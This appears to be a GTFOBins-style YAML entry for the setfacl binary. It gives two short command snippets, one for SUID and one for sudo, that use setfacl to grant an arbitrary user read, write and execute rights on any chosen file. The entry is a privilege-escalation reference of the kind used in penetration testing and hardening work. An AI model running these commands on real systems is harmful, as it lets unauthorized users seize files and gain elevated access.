---
description: This can be run with elevated privileges to change ownership and then read, write, or execute a file.
functions:
  suid:
    - code: |
        LFILE=file_to_change
        USER=somebody
        ./setfacl -m u:$USER:rwx $LFILE
  sudo:
    - code: |
        LFILE=file_to_change
        USER=somebody
        sudo setfacl -m -u:$USER:rwx $LFILE
---
